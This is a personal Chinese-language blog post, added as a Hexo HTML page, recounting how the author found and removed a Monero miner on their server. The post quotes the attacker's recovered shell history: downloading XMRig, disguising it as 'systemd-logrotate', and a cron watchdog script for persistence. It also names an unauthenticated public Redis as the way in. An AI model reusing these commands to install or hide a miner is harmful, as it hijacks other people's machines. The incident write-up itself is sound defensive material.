@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Hexo
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            记一次被挖矿。。
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h2 id="记一次被挖矿。。"><a href="#记一次被挖矿。。" class="headerlink" title="记一次被挖矿。。"></a>记一次被挖矿。。</h2><p>top 发现cpu 使用率 100%。。 </p>
+<p>12核的cpu 1200% ! 😂 笑哭</p>
+<p>占用cpu 最高的是 systemd-logrotated</p>
+<p>logrotate。。 乍一看以为是系统日志切割服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/logrotate.d/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这个是系统自带的一个日志切割配置目录</span></span><br></pre></td></tr></table></figure>
+
+<p>把有问题的切割全都清理了以后 cpu突然降下来了。</p>
+<p>一喜……以为问题就是这个。 </p>
+<p>可没2分钟。cpu 100%。。。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">history</span><br><span class="line">  504  crontab -e</span><br><span class="line">  505  top</span><br><span class="line">  506  cd /usr/bin</span><br><span class="line">  507  mkdir .git</span><br><span class="line">  508  cd .git</span><br><span class="line">  509  wget https://github.com/nanopool/xmrig/releases/download/v2.8.1/xmrig-2.8.1-linux-CPU.tar.gz</span><br><span class="line">  510  tar -xzvf xmrig-2.8.1-linux-CPU.tar.gz</span><br><span class="line">  511  rm -rf xmrig-2.8.1-linux-CPU.tar.gz</span><br><span class="line">  512  rm -rf xmrig-notls</span><br><span class="line">  513  killall systemd-logrotate</span><br><span class="line">  514  mv ./xmrig ../systemd-logrotate</span><br><span class="line">  515  cd ../</span><br><span class="line">  516  rm -rf .git</span><br><span class="line">  517  rm config.json</span><br><span class="line">  518  vim config.json</span><br><span class="line">  519  chmod +x systemd-logrotate</span><br><span class="line">  520  vim ./cronctl</span><br><span class="line">  521  chmod +xcronctl</span><br><span class="line">  522  chmod +x ./cronctl</span><br><span class="line">  523  vim /etc/crontab</span><br><span class="line">  524  cronctl</span><br><span class="line"></span><br><span class="line">cat /etc/crontab</span><br><span class="line">*/1 * * * * root      cronctl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat cronctl</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">if ps ax | grep -v grep | grep systemd-logrotate &gt; /dev/null</span><br><span class="line">then</span><br><span class="line">     echo \" \"</span><br><span class="line">else</span><br><span class="line"> systemd-logrotate</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl https://github.com/nanopool/xmrig/blob/master/README.md</span><br><span class="line">…………</span><br><span class="line">XMRig</span><br><span class="line"> Monero将于10月18日更改PoW算法，所有矿工和代理都应更新为v2.8 + </span><br><span class="line"></span><br><span class="line">Github所有版本 GitHub发布 GitHub发布日期 GitHub许可证 GitHub明星 GitHub分叉</span><br><span class="line"></span><br><span class="line">XMRig是一款高性能的Monero（XMR）CPU挖掘器，官方支持Windows。最初基于cpuminer-multi，具有大量优化/重写并删除了大量遗留代码，因为版本1.0.0在C ++上完全从头开始重写。</span><br><span class="line"></span><br><span class="line">这是CPU挖掘版，还有NVIDIA GPU版和AMD GPU版。</span><br><span class="line">下一版本的路线图。</span><br><span class="line">…………</span><br><span class="line">原来是矿机大大。。。 打扰了</span><br></pre></td></tr></table></figure>
+
+
+
+<p>清理</p>
+<p>说到清理方法。。 作为一个小白，处理方法就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pkill systemd-logrotated</span><br><span class="line">vim &#x2F;etc&#x2F;crontab</span><br><span class="line"># *&#x2F;1 * * * * root      cronctl</span><br></pre></td></tr></table></figure>
+
+<p>定位到入侵方法</p>
+<p>redis 公网请求 未设置密码。。。</p>
+<p>发布时间：2018年12月18日</p>
+
+    </div>
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>.
+        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label>
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+
+</body>
+
+</html>
